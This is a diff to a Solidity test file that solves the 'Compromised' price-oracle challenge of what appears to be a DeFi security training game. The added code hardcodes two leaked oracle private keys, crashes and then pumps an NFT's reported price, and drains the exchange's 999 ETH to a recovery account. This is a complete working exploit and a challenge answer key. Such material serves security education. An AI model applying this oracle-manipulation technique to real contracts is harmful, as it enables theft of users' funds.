@@ -20,7 +20,6 @@ contract CompromisedChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
 
-
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
         0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
@@ -75,7 +74,47 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        uint256 pk1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 pk2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+
+        // Verify the private keys correspond to the trusted sources
+        assertEq(vm.addr(pk1), sources[0]);
+        assertEq(vm.addr(pk2), sources[1]);
+
+        // 1. Crash the price of DVNFT to 0
+        vm.prank(sources[0]);
+        oracle.postPrice("DVNFT", 0);
+        vm.prank(sources[1]);
+        oracle.postPrice("DVNFT", 0);
+
+        // 2. Player buys one NFT. Must pay > 0, so we pay 1 wei.
+        // Since price is 0, the exchange will refund the 1 wei.
+        vm.startPrank(player);
+        uint256 id = exchange.buyOne{value: 1}();
+        vm.stopPrank();
+
+        // 3. Pump the price to the exchange's total balance (999 ETH)
+        uint256 drainPrice = EXCHANGE_INITIAL_ETH_BALANCE;
+        vm.prank(sources[0]);
+        oracle.postPrice("DVNFT", drainPrice);
+        vm.prank(sources[1]);
+        oracle.postPrice("DVNFT", drainPrice);
+
+        // 4. Player sells the NFT at the manipulated high price
+        vm.startPrank(player);
+        nft.approve(address(exchange), id);
+        exchange.sellOne(id);
+        vm.stopPrank();
+
+        // 5. Restore the oracle price to the initial value
+        vm.prank(sources[0]);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.prank(sources[1]);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+        // 6. Transfer all captured ETH to the recovery account
+        vm.prank(player);
+        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
     }
 
     /**
